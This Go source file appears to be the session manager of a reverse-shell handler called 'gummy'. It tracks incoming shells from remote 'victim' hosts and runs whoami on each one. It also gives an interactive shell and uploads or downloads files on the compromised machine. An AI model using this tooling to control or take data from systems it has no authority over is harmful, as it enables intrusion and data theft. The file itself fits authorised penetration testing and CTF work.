package session

import (
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/chzyer/readline"
	"github.com/chsoares/gummy/internal/shell"
	"github.com/chsoares/gummy/internal/transfer"
	"github.com/chsoares/gummy/internal/ui"
	"golang.org/x/term"
)

// Manager gerencia múltiplas sessões de reverse shell
type Manager struct {
	sessions        map[string]*SessionInfo // Mapa de sessões ativas
	mu              sync.RWMutex            // Proteção concorrente
	nextID          int                     // Próximo ID numérico
	activeConn      net.Conn                // Conexão atualmente ativa (se houver)
	selectedSession *SessionInfo            // Sessão selecionada (mas não necessariamente ativa)
	menuActive      bool                    // Se estamos no menu principal
}

// SessionInfo contém informações sobre uma sessão
type SessionInfo struct {
	ID       string    // ID único da sessão (hex)
	NumID    int       // ID numérico para facilitar uso
	Conn     net.Conn  // Conexão TCP
	RemoteIP string    // IP da vítima
	Whoami   string    // user@host da vítima
	Handler  *shell.Handler // Shell handler
	Active   bool      // Se está sendo usada atualmente
}

// NewManager cria um novo gerenciador de sessões
func NewManager() *Manager {
	return &Manager{
		sessions:        make(map[string]*SessionInfo),
		nextID:          1,
		selectedSession: nil,
		menuActive:      true,
	}
}

// AddSession adiciona uma nova sessão ao gerenciador
func (m *Manager) AddSession(id string, conn net.Conn, remoteIP string) {
	m.mu.Lock()
	defer m.mu.Unlock()

	handler := shell.NewHandler(conn, id)

	// Configure callback para quando conexão fechar
	handler.SetCloseCallback(func(sessionID string) {
		m.RemoveSession(sessionID)
	})

	session := &SessionInfo{
		ID:       id,
		NumID:    m.nextID,
		Conn:     conn,
		RemoteIP: remoteIP,
		Whoami:   "detecting...",
		Handler:  handler,
		Active:   false,
	}

	m.sessions[id] = session
	m.nextID++

	// Detecta whoami em background
	go m.detectWhoami(session)

	// Inicia monitoramento da sessão
	go m.monitorSession(session)

	if m.menuActive {
		// Se estivermos no menu, quebrar a linha atual, mostrar notificação e novo prompt
		fmt.Printf("\r%s\n%s", ui.SessionOpened(session.NumID, remoteIP), ui.Prompt())
	} else {
		// Se não estivermos no menu, só mostrar a notificação
		fmt.Println(ui.SessionOpened(session.NumID, remoteIP))
	}
}

// RemoveSession remove uma sessão do gerenciador
func (m *Manager) RemoveSession(id string) {
	m.mu.Lock()
	defer m.mu.Unlock()

	session, exists := m.sessions[id]
	if !exists {
		return
	}

	fmt.Println(ui.SessionClosed(session.NumID, session.RemoteIP))

	// Se era a sessão selecionada, limpar seleção
	if m.selectedSession != nil && m.selectedSession.ID == id {
		m.selectedSession = nil
	}

	delete(m.sessions, id)

	// Se era a sessão ativa, voltar ao menu
	if session.Active {
		m.activeConn = nil
		m.menuActive = true
		if len(m.sessions) > 0 {
			m.showMenu()
		} else {
			fmt.Println("No active sessions.")
		}
	}
}

// ListSessions mostra todas as sessões ativas
func (m *Manager) ListSessions() {
	m.mu.RLock()
	defer m.mu.RUnlock()

	if len(m.sessions) == 0 {
		fmt.Println(ui.Info("No active sessions."))
		return
	}

	fmt.Println()
	fmt.Println(ui.Title("Active Sessions"))
	fmt.Printf("%sID   Remote Address    Whoami%s\n", ui.ColorBrightBlack, ui.ColorReset)
	fmt.Printf("%s--   --------------    ------%s\n", ui.ColorBrightBlack, ui.ColorReset)

	// Ordenar por NumID para exibição consistente
	var sessions []*SessionInfo
	for _, session := range m.sessions {
		sessions = append(sessions, session)
	}
	sort.Slice(sessions, func(i, j int) bool {
		return sessions[i].NumID < sessions[j].NumID
	})

	for _, session := range sessions {
		sessionLine := fmt.Sprintf("%-3d %-16s %s", session.NumID, session.RemoteIP, session.Whoami)
		if session.Active {
			fmt.Printf("%s\n", ui.SessionActive(sessionLine))
		} else {
			fmt.Printf("%s\n", ui.SessionInactive(sessionLine))
		}
	}
	fmt.Println()
}

// UseSession seleciona uma sessão específica (não entra na shell)
func (m *Manager) UseSession(numID int) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	var targetSession *SessionInfo
	for _, session := range m.sessions {
		if session.NumID == numID {
			targetSession = session
			break
		}
	}

	if targetSession == nil {
		return fmt.Errorf("session %d not found", numID)
	}

	// Testa se a sessão está viva antes de selecioná-la
	targetSession.Conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
	_, err := targetSession.Conn.Write([]byte{})
	targetSession.Conn.SetWriteDeadline(time.Time{})

	if err != nil {
		// Sessão morta, remove ela
		m.mu.Unlock()
		fmt.Println(ui.Error("Session is dead, removing..."))
		m.RemoveSession(targetSession.ID)
		return fmt.Errorf("session %d is no longer alive", numID)
	}

	m.selectedSession = targetSession
	fmt.Println(ui.UsingSession(targetSession.NumID, targetSession.RemoteIP))

	return nil
}

// KillSession mata uma sessão específica
func (m *Manager) KillSession(numID int) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	var targetSession *SessionInfo
	for _, session := range m.sessions {
		if session.NumID == numID {
			targetSession = session
			break
		}
	}

	if targetSession == nil {
		return fmt.Errorf("session %d not found", numID)
	}

	// Fecha a conexão
	targetSession.Conn.Close()

	// Se era a sessão selecionada, limpa seleção
	if m.selectedSession != nil && m.selectedSession.ID == targetSession.ID {
		m.selectedSession = nil
	}

	// Remove da lista
	delete(m.sessions, targetSession.ID)

	fmt.Println(ui.SessionClosed(targetSession.NumID, targetSession.RemoteIP))

	return nil
}

// detectWhoami detecta user@host da sessão em background
func (m *Manager) detectWhoami(session *SessionInfo) {
	// Aguarda um pouco para a shell se estabilizar
	time.Sleep(800 * time.Millisecond)

	// Comando mais direto e confiável
	whoamiCmd := "echo $(whoami)@$(hostname)\n"
	_, err := session.Conn.Write([]byte(whoamiCmd))
	if err != nil {
		session.Whoami = "unknown"
		return
	}

	// Define timeout maior para leitura
	session.Conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	// Lê toda a resposta em múltiplas tentativas
	allData := ""
	buffer := make([]byte, 1024)

	for i := 0; i < 10; i++ { // máximo 10 tentativas
		n, err := session.Conn.Read(buffer)
		if err != nil {
			if i > 0 { // Se já lemos algo, pode ter terminado
				break
			}
			session.Whoami = "unknown"
			return
		}

		allData += string(buffer[:n])

		// Se temos pelo menos uma linha completa, processa
		if strings.Contains(allData, "\n") {
			lines := strings.Split(allData, "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				// Procura por user@host sem comandos
				if strings.Contains(line, "@") &&
				   !strings.Contains(line, "echo") &&
				   !strings.Contains(line, "whoami") &&
				   !strings.Contains(line, "hostname") &&
				   !strings.Contains(line, "$") {

					// Limpa a linha
					cleaned := strings.ReplaceAll(line, "\r", "")
					cleaned = strings.TrimSpace(cleaned)

					// Valida formato básico: palavra@palavra
					parts := strings.Split(cleaned, "@")
					if len(parts) == 2 && len(parts[0]) > 0 && len(parts[1]) > 0 && len(cleaned) < 50 {
						session.Whoami = cleaned

						// Drena o restante rapidamente
						go func() {
							time.Sleep(100 * time.Millisecond)
							drainBuffer := make([]byte, 2048)
							session.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
							for {
								n, err := session.Conn.Read(drainBuffer)
								if err != nil || n == 0 {
									break
								}
							}
							session.Conn.SetReadDeadline(time.Time{})
						}()

						return
					}
				}
			}
		}

		// Pequena pausa entre tentativas
		time.Sleep(100 * time.Millisecond)
	}

	// Remove timeout
	session.Conn.SetReadDeadline(time.Time{})
	session.Whoami = "unknown"
}

// monitorSession monitora a saúde da sessão em background
func (m *Manager) monitorSession(session *SessionInfo) {
	for {
		time.Sleep(5 * time.Second) // Verifica a cada 5 segundos

		// Verifica se a sessão ainda existe
		m.mu.RLock()
		_, exists := m.sessions[session.ID]
		m.mu.RUnlock()

		if !exists {
			return // Sessão foi removida, para o monitoramento
		}

		// Testa se a conexão está viva
		session.Conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
		_, err := session.Conn.Write([]byte{})
		session.Conn.SetWriteDeadline(time.Time{})

		if err != nil {
			// Conexão morta, remove a sessão
			fmt.Printf("\r\n%s\r\n", ui.SessionClosed(session.NumID, session.RemoteIP))
			m.RemoveSession(session.ID)

			// Se estava no menu, mostra novo prompt
			if m.menuActive {
				if m.selectedSession != nil {
					fmt.Print(ui.PromptWithSession(m.selectedSession.NumID))
				} else {
					fmt.Print(ui.Prompt())
				}
			}
			return
		}
	}
}

// ShellSession entra na shell interativa da sessão selecionada
func (m *Manager) ShellSession() error {
	m.mu.Lock()

	if m.selectedSession == nil {
		m.mu.Unlock()
		return fmt.Errorf("no session selected. Use 'use <id>' first")
	}

	targetSession := m.selectedSession

	// Desativa sessão anterior
	for _, session := range m.sessions {
		session.Active = false
	}

	targetSession.Active = true
	m.activeConn = targetSession.Conn
	m.menuActive = false

	m.mu.Unlock()

	fmt.Println(ui.Info("Entering interactive shell. Press F12 to return to menu"))

	// Inicia shell handler (bloqueia até sair)
	err := targetSession.Handler.Start()

	// Quando sair da shell, verificar se sessão ainda existe
	m.mu.Lock()
	if _, exists := m.sessions[targetSession.ID]; exists {
		targetSession.Active = false
	}
	m.activeConn = nil
	m.menuActive = true
	sessionCount := len(m.sessions)
	m.mu.Unlock()

	// Limpa buffer stdin antes de voltar ao menu
	m.flushStdin()

	if sessionCount > 0 {
		m.showMenu()
	} else {
		fmt.Println(ui.Info("No active sessions."))
	}

	return err
}

// StartMenu inicia o loop do menu principal
func (m *Manager) StartMenu() {
	// Setup readline with history
	homeDir, _ := os.UserHomeDir()
	historyFile := filepath.Join(homeDir, ".gummy", "history")

	// Create .gummy directory if it doesn't exist
	os.MkdirAll(filepath.Join(homeDir, ".gummy"), 0755)

	rl, err := readline.NewEx(&readline.Config{
		HistoryFile:            historyFile,
		HistoryLimit:           1000,
		DisableAutoSaveHistory: false,
		InterruptPrompt:        "^C",
		EOFPrompt:              "",
		HistorySearchFold:      true,
	})
	if err != nil {
		fmt.Printf("Warning: readline init failed, using basic input: %v\n", err)
		m.startMenuBasic()
		return
	}
	defer rl.Close()

	for {
		// Só mostra prompt e lê se estivermos no menu
		if m.menuActive {
			// Show appropriate prompt based on selected session
			if m.selectedSession != nil {
				rl.SetPrompt(ui.PromptWithSession(m.selectedSession.NumID))
			} else {
				rl.SetPrompt(ui.Prompt())
			}

			line, err := rl.Readline()
			if err != nil {
				if err == readline.ErrInterrupt {
					// Ctrl+C on empty line exits
					if len(line) == 0 {
						fmt.Println() // Newline after ^C
						fmt.Println(ui.Success("Goodbye!"))
						os.Exit(0)
					} else {
						continue
					}
				} else if err == io.EOF {
					// Ignore EOF completely (Ctrl+D, Delete key, etc)
					// Only exit via Ctrl+C or "exit" command
					continue
				}
				break
			}

			command := strings.TrimSpace(line)
			if command == "" {
				continue
			}

			m.handleCommand(command)
		}
	}
}

// startMenuBasic is a fallback for when readline fails
func (m *Manager) startMenuBasic() {
	for {
		if m.menuActive {
			if m.selectedSession != nil {
				fmt.Print(ui.PromptWithSession(m.selectedSession.NumID))
			} else {
				fmt.Print(ui.Prompt())
			}

			var command string
			fmt.Scanln(&command)
			command = strings.TrimSpace(command)
			if command == "" {
				continue
			}

			m.handleCommand(command)
		}
	}
}

// handleCommand processa comandos do menu
func (m *Manager) handleCommand(command string) {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return
	}

	switch parts[0] {
	case "help", "h":
		m.showHelp()
	case "sessions", "list", "ls":
		m.ListSessions()
	case "use":
		if len(parts) < 2 {
			fmt.Println(ui.Error("Usage: use <session_id>"))
			return
		}
		numID, err := strconv.Atoi(parts[1])
		if err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Invalid session ID: %s", parts[1])))
			return
		}
		m.UseSession(numID)
	case "shell":
		err := m.ShellSession()
		if err != nil && err != io.EOF {
			fmt.Println(ui.Error(err.Error()))
		}
	case "kill":
		if len(parts) < 2 {
			fmt.Println(ui.Error("Usage: kill <session_id>"))
			return
		}
		numID, err := strconv.Atoi(parts[1])
		if err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Invalid session ID: %s", parts[1])))
			return
		}
		err = m.KillSession(numID)
		if err != nil {
			fmt.Println(ui.Error(err.Error()))
		}
	case "exit", "quit", "q":
		fmt.Println(ui.Success("Goodbye!"))
		os.Exit(0)
	case "clear", "cls":
		fmt.Print("\033[2J\033[H")
	case "upload":
		if len(parts) < 2 {
			fmt.Println(ui.Error("Usage: upload <local_path> [remote_path]"))
			return
		}
		remotePath := ""
		if len(parts) >= 3 {
			remotePath = parts[2]
		}
		m.handleUpload(parts[1], remotePath)
	case "download":
		if len(parts) < 2 {
			fmt.Println(ui.Error("Usage: download <remote_path> [local_path]"))
			return
		}
		localPath := ""
		if len(parts) >= 3 {
			localPath = parts[2]
		}
		m.handleDownload(parts[1], localPath)
	default:
		fmt.Println(ui.Warning(fmt.Sprintf("Unknown command: %s (type 'help' for available commands)", parts[0])))
	}
}

// showMenu mostra o menu principal com sessões ativas
func (m *Manager) showMenu() {
	m.ListSessions()
}

// showHelp mostra ajuda dos comandos
func (m *Manager) showHelp() {
	fmt.Println()
	fmt.Println(ui.CommandHelp("Available Commands"))
	fmt.Println(ui.Command("sessions, list, ls              - List active sessions"))
	fmt.Println(ui.Command("use <id>                       - Select session with given ID"))
	fmt.Println(ui.Command("shell                          - Enter interactive shell (requires selected session)"))
	fmt.Println(ui.Command("upload <local> [remote]        - Upload file to remote system"))
	fmt.Println(ui.Command("download <remote> [local]      - Download file from remote system"))
	fmt.Println(ui.Command("kill <id>                      - Kill session with given ID"))
	fmt.Println(ui.Command("help, h                        - Show this help"))
	fmt.Println(ui.Command("clear, cls                     - Clear screen"))
	fmt.Println(ui.Command("exit, quit, q                  - Exit Gummy"))
	fmt.Println()
}

// GetSessionCount retorna o número de sessões ativas
func (m *Manager) GetSessionCount() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.sessions)
}

// flushStdin limpa o buffer stdin para evitar comandos residuais
func (m *Manager) flushStdin() {
	if !term.IsTerminal(int(os.Stdin.Fd())) {
		return
	}

	// Pequena pausa para garantir que dados residuais chegaram
	time.Sleep(10 * time.Millisecond)

	// Flush usando syscall
	syscall.Syscall(syscall.SYS_IOCTL, uintptr(os.Stdin.Fd()), uintptr(0x540B), 0) // TCFLSH
}

// handleUpload handles file upload command
func (m *Manager) handleUpload(localPath, remotePath string) {
	// Check if there's a selected session
	if m.selectedSession == nil {
		fmt.Println(ui.Error("No session selected. Use 'use <id>' first."))
		return
	}

	// Check if local file exists
	if _, err := os.Stat(localPath); os.IsNotExist(err) {
		fmt.Println(ui.Error(fmt.Sprintf("Local file not found: %s", localPath)))
		return
	}

	// Create transferer
	t := transfer.New(m.selectedSession.Conn, m.selectedSession.ID)

	// Perform upload
	err := t.Upload(localPath, remotePath)
	if err != nil {
		fmt.Println(ui.Error(fmt.Sprintf("Upload failed: %v", err)))
		return
	}

	// Drain any output from transfer commands
	t.DrainOutput()
}

// handleDownload handles file download command
func (m *Manager) handleDownload(remotePath, localPath string) {
	// Check if there's a selected session
	if m.selectedSession == nil {
		fmt.Println(ui.Error("No session selected. Use 'use <id>' first."))
		return
	}

	// Create transferer
	t := transfer.New(m.selectedSession.Conn, m.selectedSession.ID)

	// Perform download
	err := t.Download(remotePath, localPath)
	if err != nil {
		fmt.Println(ui.Error(fmt.Sprintf("Download failed: %v", err)))
		return
	}

	// Drain any output from transfer commands
	t.DrainOutput()
}